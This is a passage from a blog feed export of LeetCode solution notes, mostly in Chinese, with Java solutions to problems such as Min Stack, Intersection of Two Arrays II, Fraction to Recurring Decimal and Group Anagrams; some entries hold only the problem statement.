<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>[<a href="https://www.cnblogs.com/fang92/p/4782743.html">ref</a>]</p>
<p>首先想到，在栈里面设置一个min变量，当栈push一个数时，和min比较，如果比他大，min不变，比他小，min更新。但是这样，pop了min之后就没有了min的数据了……</p>
<p>也就是说，min这个数据，不只要维护当前的最小值，还要有之前的栈里面的数据信息。也就是说，min这个数据应该和栈同步增长数据和减少数据，这样自然想到min应该也是一个栈。而且这个栈的栈顶应该是整个栈的最小值，这样，才能取出来。于是，很自然的想到，minstack这个栈，在datastack进行push（x）操作的时候，minstack要取出他的栈顶元素（最小值min），和x进来的值进行比较，如果x&gt;min,minstack就push(min),否则，push(x);</p>
<p>一种优化的办法，就是每次push(x)的时候，都比较min和x的大小，如果x&gt;min,minstack不进行操作，否则，对于minstack进行push(x)的操作。这样相应的pop操作也要改变。每次pop的时候，都要检查pop出来的值x是否大于min,如果是，则minstack不进行操作，如果x==min,那么对minstack进行pop（）操作。这样，对于minstack的存储空间有一定的降低。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; numStack, minStack;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MinStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        numStack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        minStack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        minStack.push(Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt;= minStack.peek()) &#123;</span><br><span class="line">            minStack.push(x);</span><br><span class="line">        &#125;</span><br><span class="line">        numStack.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (numStack.pop().intValue() == minStack.peek()) &#123;</span><br><span class="line">            minStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> numStack.peek();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> minStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Stack </tag>
            
            <tag> Design </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[164. Maximum Gap]]></title>
      <url>/wiki/2017/10/10/Leetcode-164-Maximum-Gap/</url>
      <content type="html"><![CDATA[<p>Given an unsorted array, find the maximum difference between the successive elements in its sorted form.</p>
<p>Return 0 if the array contains less than 2 elements.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,6,9,1]</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: The sorted form of the array is [1,3,6,9], either</span><br><span class="line">             (3,6) or (6,9) has the maximum difference 3.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [10]</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: The array contains less than 2 elements, therefore return 0.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>You may assume all elements in the array are non-negative integers and fit in the 32-bit signed integer range.</li>
<li>Try to solve it in linear time/space.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[4. Median of Two Sorted Arrays]]></title>
      <url>/wiki/2017/10/10/Leetcode-4-Median-of-Two-Sorted-Arrays/</url>
      <content type="html"><![CDATA[<p>There are two sorted arrays <strong>nums1</strong> and <strong>nums2</strong> of size $m$ and $n$ respectively.</p>
<p>Find the median of the two sorted arrays. The overall run time complexity should be $O(\log (m+n))$.</p>
<p>You may assume <strong>nums1</strong> and <strong>nums2</strong> cannot be both empty.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 3]</span><br><span class="line">nums2 = [2]</span><br><span class="line">The median is 2.0</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 2]</span><br><span class="line">nums2 = [3, 4]</span><br><span class="line">The median is (2 + 3)/2 = 2.5</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Binary Search </tag>
            
            <tag> Divide and Conquer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[350. Intersection of Two Arrays II]]></title>
      <url>/wiki/2017/10/10/Leetcode-350-Intersection-of-Two-Arrays-II/</url>
      <content type="html"><![CDATA[<p>Given two arrays, write a function to compute their intersection.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums1 = [1,2,2,1], nums2 = [2,2]</span><br><span class="line">Output: [2,2]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]</span><br><span class="line">Output: [4,9]</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:</p>
<ul>
<li>Each element in the result should appear as many times as it shows in both arrays.</li>
<li>The result can be in any order.</li>
</ul>
<p><strong>Follow up</strong>:</p>
<ul>
<li>What if the given array is already sorted? How would you optimize your algorithm?</li>
<li>What if <em>nums1</em>‘s size is small compared to <em>nums2</em>‘s size? Which algorithm is better?</li>
<li>What if elements of <em>nums2</em> are stored on disk, and the memory is limited such that you cannot load all elements into the memory at once?</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>两个数组的交集。这道题目是LeetCode 349. Intersection of Two Arrays的延伸，前者返回的交集中每个元素出现一次，这里要求中每个元素出现的次数应与元素在两个数组中出现的次数一致。那么一种非常直接的方法就是把前者的Set该成HashMap来记录每个元素出现的次数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] intersect(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums1) map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums2)</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(num) &amp;&amp; map.get(num) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            map.put(num, map.get(num) - <span class="number">1</span>);</span><br><span class="line">            list.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[list.size()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list.size(); i++)</span><br><span class="line">        res[i] = list.get(i);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[166. Fraction to Recurring Decimal]]></title>
      <url>/wiki/2017/10/10/Leetcode-166-Fraction-to-Recurring-Decimal/</url>
      <content type="html"><![CDATA[<p>Given two integers representing the numerator and denominator of a fraction, return the fraction in string format.</p>
<p>If the fractional part is repeating, enclose the repeating part in parentheses.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: numerator = 1, denominator = 2</span><br><span class="line">Output: &quot;0.5&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: numerator = 2, denominator = 1</span><br><span class="line">Output: &quot;2&quot;</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: numerator = 2, denominator = 3</span><br><span class="line">Output: &quot;0.(6)&quot;</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目涉及基本的数学，难点在于如何判断数字重复以及细节的处理。首先要注意正负号、0这样的细节，然后考虑到整数可能越界，所以统一转换为长整型long。判断数字重复关键在于判断余数的重复，所以我们可以将余数和余数的位置放在哈希表中，当余数重复时，确定重复区间，加上括号</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">fractionToDecimal</span><span class="params">(<span class="keyword">int</span> numerator, <span class="keyword">int</span> denominator)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 处理0</span></span><br><span class="line">    <span class="keyword">if</span> (numerator == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">    </span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    HashMap&lt;Long, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();        </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理负数</span></span><br><span class="line">    <span class="keyword">boolean</span> isPositive = numerator &lt; <span class="number">0</span> == denominator &lt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!isPositive)  sb.append(<span class="string">"-"</span>);</span><br><span class="line">    <span class="keyword">long</span> numeratorLong = Math.abs((<span class="keyword">long</span>) numerator);</span><br><span class="line">    <span class="keyword">long</span> denominatorLong = Math.abs((<span class="keyword">long</span>) denominator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 整数部分</span></span><br><span class="line">    sb.append(numeratorLong / denominatorLong);</span><br><span class="line">    <span class="keyword">long</span> reminder = numeratorLong % denominatorLong;</span><br><span class="line">    <span class="keyword">if</span> (reminder == <span class="number">0</span>) <span class="keyword">return</span> sb.toString();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 小数部分</span></span><br><span class="line">    sb.append(<span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">int</span> index = sb.length();</span><br><span class="line">    <span class="keyword">while</span> (reminder != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!map.containsKey(reminder)) &#123; <span class="comment">// 放入分子和分子所在的位置</span></span><br><span class="line">            map.put(reminder, index++);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 发现重复，在合适的位置加入括号, 并结束</span></span><br><span class="line">            sb.insert(map.get(reminder), <span class="string">"("</span>);</span><br><span class="line">            sb.append(<span class="string">')'</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 添加商</span></span><br><span class="line">        reminder *= <span class="number">10</span>;</span><br><span class="line">        sb.append(reminder / denominatorLong);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 更新余数</span></span><br><span class="line">        reminder %= denominatorLong;</span><br><span class="line">    &#125; <span class="comment">// end while</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sb.toString();    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[171. Excel Sheet Column Number]]></title>
      <url>/wiki/2017/10/10/Leetcode-171-Excel-Sheet-Column-Number/</url>
      <content type="html"><![CDATA[<p>Given a column title as appear in an Excel sheet, return its corresponding column number.</p>
<p>For example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A -&gt; 1</span><br><span class="line">B -&gt; 2</span><br><span class="line">C -&gt; 3</span><br><span class="line">...</span><br><span class="line">Z -&gt; 26</span><br><span class="line">AA -&gt; 27</span><br><span class="line">AB -&gt; 28 </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;A&quot;</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;AB&quot;</span><br><span class="line">Output: 28</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;ZY&quot;</span><br><span class="line">Output: 701</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>相当于把26进制数转换为10进制数字。从最低位到最高位依次转换，某一位的系数用<code>addOn</code>表示。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">titleToNumber</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n = s.length();</span><br><span class="line">    <span class="keyword">int</span> addOn = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        res += addOn*(s.charAt(n - i - <span class="number">1</span>) - <span class="string">'A'</span> + <span class="number">1</span>);</span><br><span class="line">        addOn = addOn*<span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[172. Factorial Trailing Zeroes]]></title>
      <url>/wiki/2017/10/10/Leetcode-172-Factorial-Trailing-Zeroes/</url>
      <content type="html"><![CDATA[<p>Given an integer $n$, return the number of trailing zeroes in $n!$.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: 3! = 6, no trailing zero.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 5</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: 5! = 120, one trailing zero.</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>: Your solution should be in logarithmic time complexity.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[49. Group Anagrams]]></title>
      <url>/wiki/2017/10/10/Leetcode-49-Group-Anagrams/</url>
      <content type="html"><![CDATA[<p>Given an array of strings, group anagrams together.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;eat&quot;, &quot;tea&quot;, &quot;tan&quot;, &quot;ate&quot;, &quot;nat&quot;, &quot;bat&quot;],</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [&quot;ate&quot;,&quot;eat&quot;,&quot;tea&quot;],</span><br><span class="line">  [&quot;nat&quot;,&quot;tan&quot;],</span><br><span class="line">  [&quot;bat&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>All inputs will be in lowercase.</li>
<li>The order of your output does not matter.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>一开始想到了最笨的方法，对于每个字符串，与其他字符串一一比对，如果是错位词，则加入到相应的List中。判断错位词详见LeetCode 242. Valid Anagram。可惜这种方法超时了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">    List&lt;List&lt;String&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    Map&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">boolean</span> isFind;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strs.length; i++) &#123;</span><br><span class="line">        isFind = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (String str: map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isAnagram(str, strs[i])) &#123;</span><br><span class="line">                res.get(map.get(str)).add(strs[i]);</span><br><span class="line">                isFind = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!isFind) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> ArrayList&lt;String&gt;());</span><br><span class="line">            res.get(res.size() - <span class="number">1</span>).add(strs[i]);</span><br><span class="line">            map.put(strs[i], res.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAnagram</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一共只有26个字母</span></span><br><span class="line">    <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        count[s.charAt(i) - <span class="string">'a'</span>]++;</span><br><span class="line">        count[t.charAt(i) - <span class="string">'a'</span>]--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : count)</span><br><span class="line">        <span class="keyword">if</span> (num != <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的方法之所以慢，是因为需要一一比对。如果$n$非常大时，而且分组非常大时，时间复杂度接近于$O(n^2)$。所以用哈希表来判断错位词比较合适。因为判断错位词的方法一般有2种(LeetCode 242. Valid Anagram)：排序和分类计数。所以这里也可以应用这两种方法。</p>
<p>首先是排序的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">    Map&lt;String, List&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String str : strs) &#123;</span><br><span class="line">        <span class="keyword">char</span>[] c = str.toCharArray();</span><br><span class="line">        Arrays.sort(c);</span><br><span class="line">        String s = String.valueOf(c);</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(s)) map.get(s).add(str);</span><br><span class="line">        <span class="keyword">else</span> map.put(String.valueOf(s), <span class="keyword">new</span> ArrayList&lt;&gt;(Collections.singletonList(str)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ArrayList(map.values());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是分类计数的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">    Map&lt;String, List&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String str : strs) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : str.toCharArray())</span><br><span class="line">            nums[c - <span class="string">'a'</span>]++;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums)</span><br><span class="line">            sb.append(num);</span><br><span class="line">        </span><br><span class="line">        String s = sb.toString();</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(s)) map.get(s).add(str);</span><br><span class="line">        <span class="keyword">else</span> map.put(String.valueOf(s), <span class="keyword">new</span> ArrayList&lt;&gt;(Collections.singletonList(str)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ArrayList(map.values());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[3. Longest Substring Without Repeating Characters]]></title>
      <url>/wiki/2017/10/10/Leetcode-3-Longest-Substring-Without-Repeating-Characters/</url>
      <content type="html"><![CDATA[<p>Given a string, find the length of the <strong>longest substring</strong> without repeating characters.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;abcabcbb&quot;</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: The answer is &quot;abc&quot;, with the length of 3.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;bbbbb&quot;</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The answer is &quot;b&quot;, with the length of 1.</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
